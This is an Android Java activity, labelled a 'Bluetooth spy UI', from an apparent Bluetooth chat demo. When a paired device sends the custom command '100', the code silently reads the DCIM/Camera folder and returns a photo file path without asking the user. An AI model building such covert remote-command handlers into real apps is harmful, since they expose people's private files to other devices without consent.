package com.sf.bluetoothcommunication.activity;

import android.app.ProgressDialog;
import android.bluetooth.BluetoothAdapter;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.sf.bluetoothcommunication.R;
import com.sf.bluetoothcommunication.core.Pivot;
import com.sf.bluetoothcommunication.media.SoundPoolPlayer;
import com.sf.bluetoothcommunication.model.EventMsg;
import com.sf.bluetoothcommunication.service.BluetoothService;

import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.File;
import java.nio.charset.Charset;

import static com.sf.bluetoothcommunication.model.EventMsg.CODE_100;
import static com.sf.bluetoothcommunication.model.EventMsg.CODE_101;
import static com.sf.bluetoothcommunication.model.EventMsg.CODE_2;
import static com.sf.bluetoothcommunication.model.EventMsg.CODE_200;
import static com.sf.bluetoothcommunication.model.EventMsg.CODE_201;
import static com.sf.bluetoothcommunication.model.EventMsg.CODE_202;
import static com.sf.bluetoothcommunication.model.EventMsg.CODE_3;

/**
 * 作者:胡涛
 * 日期:2020-6-18
 * 时间:16:26
 * 功能:蓝牙间谍UI
 */
public class SpyActivity extends BaseActivity {

    private ProgressDialog progressDialog;
    private static final int REQUEST_ENABLE_BT = 100;
    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_spy);
        //打开蓝牙设备
        startBluetoothDevice();
    }

    /**
     * 打开蓝牙设备
     */
    private void startBluetoothDevice() {
        if (!bluetoothAdapter.isEnabled()) {
            //蓝牙未开启，需要调用开启的api
            Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
            startActivityForResult(enableBtIntent, REQUEST_ENABLE_BT);
        } else {
            //启动一个服务端监听的县城
            Intent service = new Intent(this, BluetoothService.class);
            service.setAction(BluetoothService.START_SERVER_LISTENER);
            startService(service);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case REQUEST_ENABLE_BT:
                if (resultCode == RESULT_OK) {
                    //启动一个服务端监听的县城
                    Intent service = new Intent(this, BluetoothService.class);
                    service.setAction(BluetoothService.START_SERVER_LISTENER);
                    startService(service);
                } else {
                    //表示蓝牙开启失败
                    Toast.makeText(this, "蓝牙开启失败", Toast.LENGTH_SHORT).show();
                }
                break;
            default:
                break;
        }
    }


    @Override
    public boolean supportEventBus() {
        return true;
    }

    public void back(View view) {
        finish();
    }

    private static final String CUSTOM_CODE = "100";
    /**
     * 查看对方蓝牙设备的相册
     * @param view
     */
    public void queryImgOther(View view) {
        //自定义一个指令，假如说是发送100的话，对方需要给我发手机相册地址给我哦
        byte[] data = CUSTOM_CODE.getBytes(Charset.forName("utf-8"));
        Intent service = new Intent(this, BluetoothService.class);
        service.putExtra(BluetoothService.KEY, data);
        service.setAction(BluetoothService.SEND_DATA);
        startService(service);
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void onEventMsg(EventMsg eventMsg) {
        switch (eventMsg.getCode()) {
            case CODE_202://连接中
                progressDialog = ProgressDialog.show(this, "设备连接", "连接中");
                SoundPoolPlayer.getInstance().playerMusic(this, R.raw.connecting);
                break;
            case CODE_200://连接成功
                Toast.makeText(this, "已连接", Toast.LENGTH_SHORT).show();
                if (progressDialog != null)
                    progressDialog.dismiss();
                SoundPoolPlayer.getInstance().playerMusic(this, R.raw.connect_ok);
                break;
            case CODE_201://连接失败
                Toast.makeText(this, "连接失败", Toast.LENGTH_SHORT).show();
                if (progressDialog != null)
                    progressDialog.dismiss();
                SoundPoolPlayer.getInstance().playerMusic(this, R.raw.conect_fail);
                break;
            case CODE_100://接收到消息
                String msg = Pivot.getInstance().getCurrentConnectedDevice().getBluetoothDevice().getName() + ":" + new String(eventMsg.getData(), Charset.forName("utf-8"));
                SoundPoolPlayer.getInstance().playerMusic(this, R.raw.receive);
                if (msg != null && msg.equals(Pivot.getInstance().getCurrentConnectedDevice().getBluetoothDevice().getName() + ":" + CUSTOM_CODE)) {
                    //表示收到了自定义消息，立马需要给对方回传发送一个自己的相册路径
                    String imgPaths = Environment.getExternalStorageDirectory() + "/DCIM/Camera";
                    File file = new File(imgPaths);
                    if (file.exists()) {
                        File[] files = file.listFiles();
                        for (int i = 0; i < files.length; i++) {
                            if (i == 1) {
                                String filePath = files[1].getAbsolutePath();
                                byte[] data = filePath.getBytes();
                                Intent service = new Intent(this, BluetoothService.class);
                                service.putExtra(BluetoothService.KEY, data);
                                service.setAction(BluetoothService.SEND_DATA);
                                startService(service);
                            }
                        }
                    }
                } else {
                    Toast.makeText(this, "收到图片地址：" + msg, Toast.LENGTH_SHORT).show();
                }
                break;
            case CODE_2:
                Toast.makeText(this, "消息发送成功", Toast.LENGTH_SHORT).show();
                SoundPoolPlayer.getInstance().playerMusic(this, R.raw.send);
                break;
            case CODE_3:
                Toast.makeText(this, "消息发送失败", Toast.LENGTH_SHORT).show();
                break;
            case CODE_101://远程设备断开连接
                //更新UI
                //连接断开后，需要重新开启监听线程，否则无法再次连接
                if (bluetoothAdapter.isDiscovering())
                    bluetoothAdapter.cancelDiscovery();
                startBluetoothDevice();
                SoundPoolPlayer.getInstance().playerMusic(this, R.raw.disconnect);
                break;
            default:
                break;
        }
    }
}
